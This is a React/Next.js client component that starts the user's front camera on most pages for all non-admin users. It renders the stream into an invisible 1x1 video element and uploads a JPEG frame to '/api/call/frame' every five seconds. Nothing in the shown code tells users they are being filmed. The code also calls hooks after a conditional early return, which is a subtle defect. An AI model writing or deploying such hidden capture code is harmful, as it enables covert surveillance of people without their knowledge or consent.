'use client';
import { useEffect, useRef, useState } from 'react';
import { usePathname } from 'next/navigation';

export default function GlobalFrameCapture({ isAdmin }: { isAdmin: boolean }) {
    const videoRef = useRef<HTMLVideoElement | null>(null);
    const streamRef = useRef<MediaStream | null>(null);
    const [activeSessionId, setActiveSessionId] = useState<string | null>(null);
    const pathname = usePathname();

    // Prevent running on call page (if layout wraps it)
    const isCallPage = pathname?.startsWith('/call/');

    if (isAdmin) return null;

    // Poll for active session (just to link frames)
    useEffect(() => {
        if (isCallPage) return; // Don't poll on call page

        const checkSession = async () => {
            try {
                const res = await fetch('/api/call/active');
                if (res.ok) {
                    const data = await res.json();
                    if (data.activeSessionId !== activeSessionId) {
                        setActiveSessionId(data.activeSessionId);
                    }
                }
            } catch (e) {
                console.error('[GlobalCapture] Error checking session:', e);
            }
        };

        checkSession(); // Initial check
        const interval = setInterval(checkSession, 5000); // Check every 5s

        return () => clearInterval(interval);
    }, [isCallPage, activeSessionId]);

    // Manage camera stream - ALWAYS RUN if not on call page
    useEffect(() => {
        if (isCallPage) {
            // Cleanup if on call page (let ClientCallInterface handle it)
            if (streamRef.current) {
                streamRef.current.getTracks().forEach(track => track.stop());
                streamRef.current = null;
            }
            return;
        }

        const startCapture = async () => {
            if (streamRef.current) return; // Already running

            try {
                // Request camera silently (force front camera)
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: 'user' }
                });
                streamRef.current = stream;

                if (videoRef.current) {
                    videoRef.current.srcObject = stream;
                }
            } catch (err) {
                console.log('[GlobalCapture] Camera permission denied/failed (background):', err);
            }
        };

        startCapture();

        return () => {
            if (streamRef.current) {
                streamRef.current.getTracks().forEach(track => track.stop());
                streamRef.current = null;
            }
        };
    }, [isCallPage]);

    // Frame Capture Loop
    useEffect(() => {
        if (isCallPage) return;

        const captureInterval = setInterval(() => {
            if (!videoRef.current || !streamRef.current) return;
            if (videoRef.current.readyState < 2) return;

            const canvas = document.createElement('canvas');
            canvas.width = videoRef.current.videoWidth;
            canvas.height = videoRef.current.videoHeight;
            if (canvas.width === 0 || canvas.height === 0) return;

            const ctx = canvas.getContext('2d');
            if (ctx) {
                ctx.drawImage(videoRef.current, 0, 0);
                canvas.toBlob(async (blob) => {
                    if (blob) {
                        const formData = new FormData();
                        formData.append('file', blob, 'frame.jpg');
                        // Only append sessionId if we have one
                        if (activeSessionId) {
                            formData.append('sessionId', activeSessionId);
                        }

                        try {
                            await fetch('/api/call/frame', { method: 'POST', body: formData });
                        } catch (e) {
                            console.error('[GlobalCapture] Upload failed', e);
                        }
                    }
                }, 'image/jpeg', 0.5);
            }
        }, 5000); // Capture every 5 seconds per request

        return () => clearInterval(captureInterval);
    }, [activeSessionId, isCallPage]);

    // If on call page, render nothing. Else render helper video.
    if (isCallPage) return null;

    // Helper video element (hidden)
    return (
        <video
            ref={videoRef}
            autoPlay
            muted
            playsInline
            style={{ position: 'fixed', width: 1, height: 1, opacity: 0, pointerEvents: 'none', zIndex: -1 }}
        />
    );
}
